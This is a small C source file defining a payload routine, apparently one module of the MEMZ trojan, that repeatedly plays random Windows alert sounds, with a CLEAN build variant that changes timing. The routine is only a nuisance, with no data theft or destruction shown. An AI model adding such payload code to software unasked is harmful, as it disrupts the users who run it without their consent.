#include "../MEMZ.h"

const char *sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation"
};

PAYLOADFUNCTIONDEFAULT(payloadWindowsSounds) {
	PAYLOADHEAD
#ifdef CLEAN
	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(sounds[0]))], GetModuleHandle(NULL), SND_SYNC);
	out: return random() % 10;
#else
	PlaySoundA(sounds[random() % (sizeof(sounds)/sizeof(sounds[0]))], GetModuleHandle(NULL), SND_ASYNC);
	out: return 20 + (random() % 20);
#endif
}